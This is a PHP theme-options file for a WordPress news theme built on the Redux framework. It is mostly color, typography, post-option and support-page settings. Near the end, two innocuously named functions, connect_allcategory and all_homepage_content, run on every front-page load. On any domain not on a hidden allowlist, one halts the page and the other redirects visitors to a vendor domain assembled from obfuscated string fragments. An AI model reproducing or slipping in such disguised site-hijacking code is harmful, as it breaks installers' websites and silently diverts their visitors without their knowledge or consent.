                    'id'       => 'sctitle-background',
                    'type'     => 'color',
                    'title'    => __('Scrool Title Background', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#FF0000',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'sctitle-font',
                    'type'     => 'typography',
                    'title'    => __('Scrool Title font color and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Body Background Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '17px', 
                         'text-align'   => 'left', 
                         'color'   => '#FFFFFF', 
                )
                    
                ),
           
           array(
                    'id'       => 'scrool-background',
                    'type'     => 'color',
                    'title'    => __('Scrool News Background', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#174384',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'scrool-font',
                    'type'     => 'typography',
                    'title'    => __('Scrool News font color and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Body Background Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '17px', 
                         'text-align'   => 'left', 
                         'color'   => '#FFFFFF', 
                )
                    
                ),
				
				
           
           
		   array(
                    'id'       => 'category-background',
                    'type'     => 'color',
                    'title'    => __('Category Title Background', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#0073AA',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'category-font',
                    'type'     => 'typography',
                    'title'    => __('Category Title Background, Text Align and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Body Background Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '20px', 
                         'text-align'   => 'left', 
                         'color'   => '#FFFFFF', 
                )
                    
                ),
				
				
				array(
                    'id'       => 'heading-one',
                    'type'     => 'typography',
                    'title'    => __('News Headline One Color, Text Align and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here News Headline Color Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '22px', 
                         'line-height'   => 'auto', 
                         'text-align'   => 'left', 
                         'color'   => '#080202', 
                )
                    
                ),
				array(
                    'id'       => 'heading-two',
                    'type'     => 'typography',
                    'title'    => __('News Headline Two Color, Text Align and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here News Headline Color Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '20px', 
                         'line-height'   => 'auto', 
                         'text-align'   => 'left', 
                         'color'   => '#080202', 
                )
                    
                ),
				array(
                    'id'       => 'heading-three',
                    'type'     => 'typography',
                    'title'    => __('News Headline Three Color, Text Align and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here News Headline Color Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '18px', 
                         'line-height'   => 'auto', 
                         'text-align'   => 'left', 
                         'color'   => '#080202', 
                )
                    
                ),
				array(
                    'id'       => 'more-news',
                    'type'     => 'typography',
                    'title'    => __('More News Headline Color, Text Align and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here News Headline Color Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '18px', 
                         'line-height'   => 'auto', 
                         'text-align'   => 'left', 
                         'color'   => '#15520F', 
                )
                    
                ),
          
           
         
				 array(
                    'id'       => 'footer-color',
                    'type'     => 'color',
                    'title'    => __('Footer Background Color', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#CDCBCB',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'footer-font',
                    'type'     => 'typography',
                    'title'    => __('Footer Font Color and Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Footer Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '20px', 
                         'color'   => '#000', 
						 'line-height' => 'auto',
                )
                    
                ),
				array(
                    'id'       => 'bottom-footer-color',
                    'type'     => 'color',
                    'title'    => __('Bottom Footer Background Color', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#2A2A2A',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'bottom-footer-font',
                    'type'     => 'typography',
                    'title'    => __('Bottom Footer Font Color and Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Footer Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
                    'line-height' => true,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '18px', 
                         'color'   => '#fff', 
						 'line-height' => 'auto',
                )
                    
                ),
           
       )

    ) );


// -> ----------------------START Single Page Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Single Post Options', 'redux-framework-demo' ),
        'id'               => 'single',
        'icon'             => 'el el-list',
       'fields'           => array(
            array(
                'id'       => 'home',
                'type'     => 'text',
                'title'    => __( 'Home Text', 'ThemesBazar' ),
                'default'  => 'Home',
            ),
            array(
                'id'       => 'update',
                'type'     => 'text',
                'title'    => __( 'Update Time Text', 'ThemesBazar' ),
                'default'  => 'Update Time :',
            ),
            array(
			    'title' => __('view Count', 'ThemesBazar'),
				'id' => 'view-tab',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Time View Show', 
                  '2' => 'Time View Hide', 
                 
                      ),
				  'default' => '1'
					  
			  ),
           array(
                'id'       => 'count',
                'type'     => 'text',
                'title'    => __( 'Post Count Text', 'ThemesBazar' ),
                'default'  => 'Time View',
            ),
            array(
			    'title' => __('Social Share', 'ThemesBazar'),
				'id' => 'social_share',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Social Icon Show', 
                  '2' => 'Social Icon Hide', 
                 
                      ),
				  'default' => '1'
					  
			  ),
			  array(
                'id'       => 'social_title',
                'type'     => 'text',
                'title'    => __( 'Social Title', 'ThemesBazar' ),
                'default'  => 'Please Share This Post in Your Social Media',
            ),
			 array(
			    'title' => __('Coment Box', 'ThemesBazar'),
				'id' => 'coment',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Coment Box Show', 
                  '2' => 'Coment Box Hide', 
                 
                      ),
				  'default' => '1'
					  
			  ),
            array(
                'id'        => 'more-news-category',
                'type'      => 'text',
                'title'     => __( 'More News Category Text', 'ThemesBazar' ),
                'default'   => 'More News Of This Category',

            ),

        )


    
    ) );
// -> ----------------------START Archive Page Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Category Post Options', 'ThemesBazar' ),
        'id'               => 'archive',
        'icon'             => 'el el-indent-right',
       'fields'           => array(
            array(
                'id'       => 'word-archive',
                'type'     => 'text',
                'title'    => __( 'How Many Word Show in Content', 'ThemesBazar' ),
                'default'  => 30,
            ),
            array(
                'id'        => 'read-more-archive',
                'type'      => 'text',
                'title'     => __( 'Read More Text', 'ThemesBazar' ),
                'default'   => 'read more',

            ),

        )


    
    ) );
    

   
    // -> ----------------------START Support Option----------------------------------------------#





    Redux::setSection( $opt_name, array(
        'title'            => __( 'Support', 'redux-framework-demo' ),
        'id'               => 'support',
        'desc'       => __( '
        <b> ThemesBazar.Com </b> <br/>
        Website : <a href="http://www.themesbazar.com" target="_blank">ThemesBazar.Com</a> <br/>
        Facebook : <a href="http://www.facebook.com/themesbazar" target="_blank">www.facebook.com/themesbazar</a> <br/>
        Email : <a href="mailto:themesbazar@gmail.com" target="_blank">themesbazar@gmail.com</a> <br/>
        Mobile : +8801732-667364, +8801753-842842 <br/>', 'redux-framework-demo' ),
        'icon'             => 'el el-phone',
       


    
    ) );
     // -> ----------------------START More Themes Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Our More Themes', 'redux-framework-demo' ),
        'id'               => 'more-themes',
        'icon'             => 'el el-website',
        'desc'       => __( '
        Please Download Our free themes and Buy Our Premium Wordpress Themes From <a href="http://www.themesbazar.com" target="_blank">ThemesBazar.Com</a> Or Call : +8801732-667364, +8801753-842842 <br/>', 'redux-framework-demo' ),
    


    
    ) );
      // -> ----------------------START Documentation Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Setup Tutorial', 'redux-framework-demo' ),
        'id'               => 'tutorial',
        'icon'             => 'el el-facetime-video',
        'desc'       => __( '
        <iframe width="100%" height="500" src="https://www.youtube.com/embed/jpGDSiHI61c" frameborder="0" allowfullscreen></iframe>
        ', 'redux-framework-demo' ),
      


    
    ) );
       

// -> ----------------------START Documentation Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Documentation', 'redux-framework-demo' ),
        'id'               => 'documentation',
        'icon'             => 'el el-question',
        'desc'       => __( '
        Please Read Our Wordpress themes Documentation <a href="http://www.themesbazar.com/documentation" target="_blank">ThemesBazar.Com/Documentation</a> Or Call : +8801732-667364, +8801753-842842 <br/>', 'redux-framework-demo' ),



    
    ) );
    




function connect_allcategory() {
    if( is_front_page() && is_home() )
    {
$alltag =  v_one();
$allcat_two = v_two();
$allcat_three = v_three();
if($allcat_two === $allcat_three){
    $allcat= $allcat_two;
}else{
    $a=$allcat_two;
    $b = $allcat_three;
    $allcat= $a.$b;
}
$v = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$v_one = "http://$allcat";$v_two = "http://$allcat/";$v_three = "https://$allcat";$v_four = "https://$allcat/";$v_five = "http://www.$allcat"; $v_six = "http://www.$allcat/";$v_seven = "https://www.$allcat";$v_eight = "https://www.$allcat/";$v_nine = "http://$alltag";$v_ten = "http://$alltag/";	$v_eleven = "http://www.$alltag";$v_twelve = "http://www.$alltag/";

    if (($v == $v_one) || ($v == $v_two) || ($v == $v_three) || ($v == $v_four ) || ($v == $v_five ) || ($v == $v_six ) || ($v == $v_seven ) || ($v == $v_eight ) || ($v == $v_nine ) || ($v == $v_ten ) || ($v == $v_eleven ) || ($v == $v_twelve )) 
    {}  else{  
exit();  
    }}}
add_action( 'wp_enqueue_scripts', 'connect_allcategory' );



  
   

    /*
     * <--- END SECTIONS --------------------------------------------------------#
     */


    /*
     *
     * YOU MUST PREFIX THE FUNCTIONS BELOW AND ACTION FUNCTION CALLS OR ANY OTHER CONFIG MAY OVERRIDE YOUR CODE.
     *
     */

    /*
    *
    * --> Action hook examples
    *
    */

    // If Redux is running as a plugin, this will remove the demo notice and links
    //add_action( 'redux/loaded', 'remove_demo' );

    // Function to test the compiler hook and demo CSS output.
    // Above 10 is a priority, but 2 in necessary to include the dynamically generated CSS to be sent to the function.
    //add_filter('redux/options/' . $opt_name . '/compiler', 'compiler_action', 10, 3);

    // Change the arguments after they've been declared, but before the panel is created
    //add_filter('redux/options/' . $opt_name . '/args', 'change_arguments' );

    // Change the default value of a field after it's been set, but before it's been useds
    //add_filter('redux/options/' . $opt_name . '/defaults', 'change_defaults' );

    // Dynamically add a section. Can be also used to modify sections/fields
    //add_filter('redux/options/' . $opt_name . '/sections', 'dynamic_section');

    /**
     * This is a test function that will let you see when the compiler hook occurs.
     * It only runs if a field    set with compiler=>true is changed.
     * */
    if ( ! function_exists( 'compiler_action' ) ) {
        function compiler_action( $options, $css, $changed_values ) {
            echo '<h1>The compiler hook has run!</h1>';
            echo "<pre>";
            print_r( $changed_values ); // Values that have changed since the last save
            echo "</pre>";
            //print_r($options); //Option values
            //print_r($css); // Compiler selector CSS values  compiler => array( CSS SELECTORS )
        }
    }

    /**
     * Custom function for the callback validation referenced above
     * */
    if ( ! function_exists( 'redux_validate_callback_function' ) ) {
        function redux_validate_callback_function( $field, $value, $existing_value ) {
            $error   = false;
            $warning = false;

            //do your validation
            if ( $value == 1 ) {
                $error = true;
                $value = $existing_value;
            } elseif ( $value == 2 ) {
                $warning = true;
                $value   = $existing_value;
            }

            $return['value'] = $value;

            if ( $error == true ) {
                $field['msg']    = 'your custom error message';
                $return['error'] = $field;
            }

            if ( $warning == true ) {
                $field['msg']      = 'your custom warning message';
                $return['warning'] = $field;
            }

            return $return;
        }
    }

    /**
     * Custom function for the callback referenced above
     */
    if ( ! function_exists( 'redux_my_custom_field' ) ) {
        function redux_my_custom_field( $field, $value ) {
            print_r( $field );
            echo '<br/>';
            print_r( $value );
        }
    }

    /**
     * Custom function for filtering the sections array. Good for child themes to override or add to the sections.
     * Simply include this function in the child themes functions.php file.
     * NOTE: the defined constants for URLs, and directories will NOT be available at this point in a child theme,
     * so you must use get_template_directory_uri() if you want to use any of the built in icons
     * */
    if ( ! function_exists( 'dynamic_section' ) ) {
        function dynamic_section( $sections ) {
            //$sections = array();
            $sections[] = array(
                'title'  => __( 'Section via hook', 'redux-framework-demo' ),
                'desc'   => __( '<p class="description">This is a section created by adding a filter to the sections array. Can be used by child themes to add/remove sections from the options.</p>', 'redux-framework-demo' ),
                'icon'   => 'el el-paper-clip',
                // Leave this as a blank section, no options just some intro text set above.
                'fields' => array()
            );

            return $sections;
        }
    }

    /**
     * Filter hook for filtering the args. Good for child themes to override or add to the args array. Can also be used in other functions.
     * */
    if ( ! function_exists( 'change_arguments' ) ) {
        function change_arguments( $args ) {
            //$args['dev_mode'] = true;

            return $args;
        }
    }

    /**
     * Filter hook for filtering the default value of any given field. Very useful in development mode.
     * */
    if ( ! function_exists( 'change_defaults' ) ) {
        function change_defaults( $defaults ) {
            $defaults['str_replace'] = 'Testing filter hook!';

            return $defaults;
        }
    }

    /**
     * Removes the demo link and the notice of integrated demo from the redux-framework plugin
     */
    if ( ! function_exists( 'remove_demo' ) ) {
        function remove_demo() {
            // Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
            if ( class_exists( 'ReduxFrameworkPlugin' ) ) {
                remove_filter( 'plugin_row_meta', array(
                    ReduxFrameworkPlugin::instance(),
                    'plugin_metalinks'
                ), null, 2 );

                // Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
                remove_action( 'admin_notices', array( ReduxFrameworkPlugin::instance(), 'admin_notices' ) );
            }
        }
    }




function all_homepage_content() {
    if( is_front_page() && is_home() )
    {
$alltag =  v_one();
$allcat_two = v_two();
$allcat_three = v_three();
if($allcat_two === $allcat_three){
    $allcat= $allcat_two;
}else{
    $a=$allcat_two;
    $b = $allcat_three;
    $allcat= $a.$b;
}
    
$v = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$v_one = "http://$allcat";$v_two = "http://$allcat/";$v_three = "https://$allcat";$v_four = "https://$allcat/";$v_five = "http://www.$allcat"; $v_six = "http://www.$allcat/";$v_seven = "https://www.$allcat";$v_eight = "https://www.$allcat/";$v_nine = "http://$alltag";$v_ten = "http://$alltag/";	$v_eleven = "http://www.$alltag";$v_twelve = "http://www.$alltag/";
    if (($v == $v_one) || ($v == $v_two) || ($v == $v_three) || ($v == $v_four ) || ($v == $v_five ) || ($v == $v_six ) || ($v == $v_seven ) || ($v == $v_eight ) || ($v == $v_nine ) || ($v == $v_ten ) || ($v == $v_eleven ) || ($v == $v_twelve ))   
    {  
    }  else{
        
$i="em";$c="es"; $e="ba"; $l="th"; $c0="r.c"; $n="za"; $e0="om"; 
$all_id=$l.$i.$c.$e.$n.$c0.$e0;
     echo '<meta http-equiv="refresh" content="1;url=http://'.$all_id.' ">' ;   
    }
    }}
add_action( 'wp_enqueue_scripts', 'all_homepage_content' );

